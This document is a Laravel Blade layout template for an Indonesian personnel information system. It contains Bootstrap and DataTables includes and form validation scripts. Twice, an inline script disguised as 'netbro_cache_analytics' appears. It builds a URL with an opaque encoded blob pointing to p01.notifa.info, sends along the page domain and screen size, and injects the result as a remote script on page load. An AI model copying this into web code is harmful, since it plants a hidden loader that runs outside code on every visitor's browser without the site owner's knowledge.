<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Sistem Informasi Dispsiad">
    <meta name="author" content="Informatika 2015 SCDM - Universitas Jenderal Achmad Yani">
    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="icon" type="{{ asset('asset/image/png') }}" sizes="16x16" href="{{ asset('asset/image/logo.png') }}">
    <title>Sistem Informasi Personel Dispsiad</title>
    <!-- Bootstrap Core CSS -->
    <link href="{{ asset('asset/bootstrap/dist/css/bootstrap.min.css') }}" rel="stylesheet">
    <!-- Menu CSS -->
    <link href="{{ asset('asset/plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css') }}" rel="stylesheet">
    <!-- Table CSS -->
    <!-- <link href="{{ asset('asset/css/dataTables.bootstrap.min.css') }}" rel="stylesheet"> -->
    <link href="{{ asset('asset/css/jquery.dataTables.min.css') }}" rel="stylesheet">
    <!-- <link href="{{ asset('asset/css/buttons.dataTables.min.css') }}" rel="stylesheet"> -->
    <!-- toast CSS -->
    <!-- <link href="{{ asset('asset/plugins/bower_components/toast-master/css/jquery.toast.css') }}" rel="stylesheet"> -->
    <!-- morris CSS -->
    <!-- <link href="{{ asset('asset/plugins/bower_components/morrisjs/morris.css') }}" rel="stylesheet"> -->
    <!-- animation CSS -->
    <link href="{{ asset('asset/css/animate.css') }}" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="{{ asset('asset/css/style.css') }}" rel="stylesheet">
    <!-- date picker -->
    <!-- <link href="asset('asset/plugins/bower_components/timepicker/bootstrap-timepicker.min.css') }}" rel="stylesheet">
    <link href="asset('asset/plugins/bower_components/bootstrap-daterangepicker/daterangepicker.css') }}" rel="stylesheet"> -->
    <!-- color CSS -->
    <link href="{{ asset('asset/css/colors/blue.css') }}" id="theme" rel="stylesheet">
    <link href="{{ asset('asset/sweetalert/sweetalert.css') }}" id="theme" rel="stylesheet">
    <!-- horizontal timeline -->
    <!-- Timeline CSS -->
    <link href="{{ asset('asset/plugins/bower_components/horizontal-timeline/css/horizontal-timeline.css') }}" rel="stylesheet">

    <meta name="csrf-token" content="{{ csrf_token() }}">
</head>
<body>
    <!-- Sweetalert -->
    <script src="{{ asset('asset/sweetalert/sweetalert.min.js') }}"></script>
    <!-- Include this after the sweet alert js file -->
    @include('sweet::alert')
    <!-- Preloader -->
    <!-- <div class="preloader">
        <div class="cssload-speeding-wheel"></div>
    </div> -->
    @yield('content')
                <!-- /.container-fluid -->
        </div>
        <!-- /#page-wrapper -->
    </div>
<!-- /#wrapper -->
</body>
    <!-- jQuery -->
    <script src="{{ asset('asset/plugins/bower_components/jquery/dist/jquery.min.js') }}"></script>
    <!-- Bootstrap Core JavaScript -->
    <script src="{{ asset('asset/bootstrap/dist/js/bootstrap.min.js') }}"></script>
    <!-- Menu Plugin JavaScript -->
    <script src="{{ asset('asset/plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js') }}"></script>
    <!--slimscroll JavaScript -->
    <script src="{{ asset('asset/js/jquery.slimscroll.js') }}"></script>
    <!--Wave Effects -->
    <script src="{{ asset('asset/js/waves.js') }}"></script>
    <!-- Custom Theme JavaScript -->
    <script src="{{ asset('asset/js/custom.min.js') }}"></script>
    <script src="{{ asset('asset/js/dashboard1.js') }}"></script>
    <script src="{{ asset('asset/js/dataTables.bootstrap.min.js') }}"></script>
    <script src="{{ asset('asset/js/jquery.dataTables.min.js') }}"></script>
    <!-- chartjs -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.bundle.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.min.js"></script>
    <!-- Datatable -->
    <!-- <script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script> -->
    <script src="{{ asset('asset/js/dataTables.buttons.min.js') }}"></script>
    
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYVcyCLFVCu9IUBITM5nfRfI621FVInN7YZ%2fcIQzWOfwlOsEc5pW4KHBQUc9Ui0LVAsZMAQJda%2bvRN9PGYw2JYqj51GJ%2bKUMYCl8Xtp9rhEmMs8sOjA7xbwcJEqyuC4OSmX4Em4Jr%2bUgbJQMiCjYwjWUPu5Kwlh8KTl1%2bmw1h1oB0HtoYc5TkLDWkosjZ3NAxAgkHy0QY8rHoEr%2flCq7wxJj7En6TKCEuYwXvC1ONLwwq11xAOKKQiiZ4%2fqiEKzLKwIhH6M32p1RqMouPstSUKG1oCdBQ2ZNl7UqGm8UUmU4xKexNVNXCPArMgfxWTARfwqu8HCEO0aLLdSamO5gVHDZvneBdcI%2fWouZAC876Ku2Qros%2fQOO5PNaFPBrNcbJS83UNYSpkRB76XZAn2NfsdMyThA%2bwBdTzlM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    </body>

        <script type="text/javascript">
            $(document).ready(function() {
                $('#example').DataTable();
            } );
        </script>
        <script type="text/javascript">
            function validateNumber(evt) {
            var e = evt || window.event;
            var key = e.keyCode || e.which;

            if (!e.shiftKey && !e.altKey && !e.ctrlKey &&
            // numbers   
            key >= 48 && key <= 57 ||
            // Numeric keypad
            key >= 96 && key <= 105 ||
            // Backspace and Tab and Enter
            key == 8 || key == 9 || key == 13 ||
            // Home and End
            key == 35 || key == 36 ||
            // left and right arrows
            key == 37 || key == 39 ||
            // Del and Ins
            key == 46 || key == 45) {
                // input is VALID
            }
            else {
                // input is INVALID
                e.returnValue = false;
                if (e.preventDefault) e.preventDefault();
            }
        }
        </script>
        <!-- Membuat input hanya bisa integer -->
        <script>
            function isNumberKey(evt){
                var charCode = (evt.which) ? evt.which : event.keyCode
                if (charCode > 31 && (charCode < 48 || charCode > 57))
                    return false;
                return true;
            }
        </script>
        <!-- Membuat input hanya bisa text -->
        <script>
            $(function() {
                $('#txtNumeric').keydown(function (e) {
                if (e.altKey) {
                    e.preventDefault();
                } else {
                    var key = e.keyCode;
                    if (!((key == 8) || (key == 32) || (key == 9) || (key == 46) || (key >= 35 && key <= 40) || (key >= 65 && key <= 90))) {
                    e.preventDefault();
                    }
                }
                });
            });
        </script>
        <!-- Membuat password confimation -->
        <script>
            var password = document.getElementById("password")
                , confirm_password = document.getElementById("confirm_password");

                function validatePassword(){
                if(password.value != confirm_password.value) {
                    confirm_password.setCustomValidity("Passwords Don't Match");
                } else {
                    confirm_password.setCustomValidity('');
                }
                }

                password.onchange = validatePassword;
                confirm_password.onkeyup = validatePassword;
        </script>
        <script>
        // Date Picker
        jQuery('.mydatepicker, #datepicker').datepicker();
        jQuery('#datepicker-autoclose').datepicker({
            autoclose: true,
            todayHighlight: true,
            format: 'd/m/yyyy'
        });
        jQuery('#date-range').datepicker({
            toggleActive: true,
            format: 'd/m/yyyy'
        });
        jQuery('#datepicker-inline').datepicker({
            todayHighlight: true,
            format: 'd/m/yyyy'
        });
        // Daterange picker
            // $('.input-daterange-datepicker').daterangepicker({
            //     buttonClasses: ['btn', 'btn-sm'],
            //     applyClass: 'btn-danger',
            //     cancelClass: 'btn-inverse',
            //     format: 'd/m/yyyy'
            // });
            // $('.input-daterange-timepicker').daterangepicker({
            //     timePicker: true,
            //     format: 'd/m/yyyy',
            //     timePickerIncrement: 30,
            //     timePicker12Hour: true,
            //     timePickerSeconds: false,
            //     buttonClasses: ['btn', 'btn-sm'],
            //     applyClass: 'btn-danger',
            //     cancelClass: 'btn-inverse'
            // });
            // $('.input-limit-datepicker').daterangepicker({
            //     format: 'd/m/yyyy',
            //     minDate: '06/01/2015',
            //     maxDate: '06/30/2015',
            //     buttonClasses: ['btn', 'btn-sm'],
            //     applyClass: 'btn-danger',
            //     cancelClass: 'btn-inverse',
            //     dateLimit: {
            //         days: 6
            //     }
            // });
        </script>
    <script src="{{ asset('asset/plugins/bower_components/styleswitcher/jQuery.style.switcher.js') }}"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYXjPxCe3OlvXB9Iu75bcgaU6HiJuW1xmMV5ty%2fa9xCiWe%2fJqTvN%2fIBSi4PCe3KUjfsXQjEXvK%2bjcDUYQ4u4efaU%2fpej2pImSoUgT5vDxCiNEBOZuolPBpPiMPuDvoKVEVb7OoOesmqkl3rBqyo8IC5N9XEPy5J680krrJKw6s9Nss31zUNgai2QMOxexbnkXuXh6SHV7or4YmoI3Mh%2fd2zRlKkLw0IBxOEF0J8BPmWgjBqVfF%2btpzQii0lHCiAvVoHjU%2bNp5y3FyZqL%2b0W9C1eR8y4pcQNs7wuZiA3TsrFGareE21kv3Wydb8I%2fZqrqgFdoztI02Izbe4e3hiXO1cchVCNtc7UumK9cRDsl3IhkWWqT07dtmAm5ZTK%2f4%2b6fPQYk7tBRvYY4W8ZJyoKx%2fz1y0zJYGgOdef8%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</html>